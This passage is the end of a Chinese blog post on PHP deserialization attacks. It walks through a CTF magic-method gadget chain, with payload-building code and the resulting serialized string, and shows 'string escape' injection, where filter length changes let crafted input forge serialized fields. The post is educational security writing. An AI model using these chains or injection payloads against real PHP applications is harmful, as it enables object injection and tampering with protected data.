<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><blockquote>
<p>如何在一个类中实例化另一个类呢？利用类的构造函数，只要第一个类被实例化就会自动实例化我们需要另外构造的类。</p>
</blockquote>
<p><strong>思路</strong>：</p>
<ol>
<li>要想得到flag，需要调用GetFlag类中的get_flag()函数。</li>
<li>在string1类可以看出，我们需要把str1实例化为GetFlag类的对象，然后看有没有字符串能调用__toString()函数。</li>
<li>往上看，func类中，__invoke()函数存在字符串拼接，满足2的预期，需要把mod2实例化为string1的对象，再找找有没有把对象当作函数的地方来调用__invoke()。</li>
<li>在funct类中找到调用$s1()函数，只需将mod1实例化为func类的对象，再找找有没有调用不存在函数的地方。</li>
<li>芜湖,我们发现Call类中test1()函数就调用了不存在的函数，我们需要把mod1实例化为funct的对象。</li>
<li>最后一步！往上看！在start__gg的析构函数就调用了test1()函数，那我们只需要把mod1实例化为__Call的对象就可以了！</li>
</ol>
<p>最后构造！</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">start_gg</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Call</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">Call</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">funct</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">funct</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">func</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">func</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">string1</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">string1</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$str1</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">GetFlag</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">GetFlag</span> <span class="p">{}</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">start_gg</span><span class="p">();</span>
<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="c1">//O:8:&#34;start_gg&#34;:1:{s:4:&#34;mod1&#34;;O:4:&#34;Call&#34;:1:{s:4:&#34;mod1&#34;;O:5:&#34;funct&#34;:1:{s:4:&#34;mod1&#34;;O:4:&#34;func&#34;:1:{s:4:&#34;mod1&#34;;O:7:&#34;string1&#34;:1:{s:4:&#34;str1&#34;;O:7:&#34;GetFlag&#34;:0:{}}}}}}
</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>payload serialize($a),得到flag。</p>
<h2 id="拓展">拓展</h2>
<h3 id="字符串逃逸">字符串逃逸</h3>
<blockquote>
<p>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>}</code> 作为结尾(字符串除外)，并且是根据长度判断内容。</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-526902876.png" alt=""></p>
<p>可以看到<code>}</code>以外的部分并没有反序列化。</p>
<h4 id="函数使字符变多">函数使字符变多</h4>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;/t/i&#39;</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span><span class="s1">&#39;ww&#39;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span>
<span class="p">}</span>
<span class="nv">$username</span> <span class="o">=</span><span class="s1">&#39;theoyu&#39;</span><span class="p">;</span>
<span class="nv">$age</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span>
<span class="nv">$user</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$age</span><span class="p">);</span>
<span class="nv">$s</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)));</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>在这个例子中，<code>filter</code>会把字符串中的t替换为两个w
我们看看输出：
<img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-2412547197.png" alt="">
可以看到filter后，我们的username变成了<code>wwheoyu</code>，为7个字符，但filter是在序列化后，所以其6个字节的长度并没有更改，也就导致了反序列失败。</p>
<p>这里我们假设一点，username是一个我们可以控制输入的变量，<code>$age=20</code>是一个不可更改的量，那我们就可以利用上面的filter函数来篡改age。</p>
<p>username我们可以控制，那么通过闭合的思想，如果我们在username的末尾构造了<code>&quot;;i:1;i:18;}</code>,那么在反序列化时，真正的age部分就会因为在<code>}</code>以外而被忽略，默认username内我们构造的age为真，达到了篡改的目的。(有点像sql注入的闭合)</p>
<p>我们已经知道了一点，filter函数的存在，username内每一个<code>t</code>将被替换为<code>ww</code>，就会导致长度+1,如果我们想构造username=<code>xxxx&quot;;i:1;i:18;}</code>,就需要把长度增加12位，那么我只需要构造username=<code>tttttttttttt&quot;;i:1;i:18;}</code>即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-1602856666.png" alt="">
如果后面我们需要添加的内容不是前面每次增加字符的整数倍，可以在<code>}</code>外面随便加一些内容使长度为前面的倍数。</p>
<h3 id="函数使字符变少">函数使字符变少</h3>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;/tt/i&#39;</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span> 
<span class="p">}</span>
<span class="nv">$username</span> <span class="o">=</span><span class="s1">&#39;ttheoyu&#39;</span><span class="p">;</span>
<span class="nv">$love</span> <span class="o">=</span> <span class="s1">&#39;game&#39;</span><span class="p">;</span>
<span class="nv">$age</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span>
<span class="nv">$user</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$love</span><span class="p">,</span><span class="nv">$age</span><span class="p">);</span>
<span class="nv">$s</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)));</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-2167858145.png" alt="">
字符减少的情况一般不止一个可修改的变量，这里我们加入<code>$love</code>变量，为什么要加入呢？与之前字符增加不一样，这里字符减少，只会把我们后面的一个变量的内容吞并，所以我要做的就是在username处构造适当的<code>tt</code>，把<code>$love</code>的关于长度部分给吞并掉，然后在<code>love</code>部分构造<code>;i:1;s:4:&quot;game&quot;;i:2;i:18;}</code>把前面被吞掉的部分补上，后面再伪造虚拟的<code>$age</code>,即可篡改。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="c1">#随便构造几个tt
</span><span class="c1"></span><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nv">$filter</span> <span class="o">=</span> <span class="s1">&#39;/tt/i&#39;</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$filter</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span> 
<span class="p">}</span>
<span class="nv">$username</span> <span class="o">=</span><span class="s1">&#39;tttttttttttttttt&#39;</span><span class="p">;</span>
<span class="nv">$love</span> <span class="o">=</span> <span class="s1">&#39;;i:1;s:4:&#34;game&#34;;i:2;i:18;}&#39;</span><span class="p">;</span>
<span class="nv">$age</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span>
<span class="nv">$user</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$love</span><span class="p">,</span><span class="nv">$age</span><span class="p">);</span>
<span class="nv">$s</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">));</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">filter</span><span class="p">(</span><span class="nv">$s</span><span class="p">)));</span>

<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-3288670259.png" alt="">
我们数一下被应该被吞的部分 ，就是<code>&quot;;i:1;s:26:</code>,一共是11个字符，那么我们构造22个<code>t</code>即可。
<img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/04/2021-04-16-510433908.png" alt=""></p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://www.cnblogs.com/youyoui/p/8610068.html">https://www.cnblogs.com/youyoui/p/8610068.html</a></li>
<li><a href="https://lethe.site/2019/08/06/%E8%B0%88%E4%B8%80%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#0x05-PHP-SESSION%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://lethe.site/2019/08/06/%E8%B0%88%E4%B8%80%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#0x05-PHP-SESSION%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></li>
</ul>
]]></content>
		</item>
		
	</channel>
</rss>
